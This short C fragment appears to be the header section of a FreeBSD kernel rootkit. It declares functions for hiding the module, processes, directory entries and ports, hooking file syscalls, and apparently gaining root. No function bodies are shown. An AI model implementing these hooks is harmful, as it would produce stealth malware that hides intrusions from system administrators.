static void bds_hide_module(void);
static int bds_process_hiding(struct thread *td, void *syscall_args);
static int bds_getdirentries(struct thread *td, void *args);
static int bds_port_hiding(struct thread *td, void *args);
static int bds_rmdir(struct thread *td, struct rmdir_args *uap);
static int bds_unlink(struct thread *td, struct unlink_args *uap);
static int bds_chdir(struct thread *td, struct chdir_args *uap);
static int bds_root(struct thread *td, void *syscall_args);
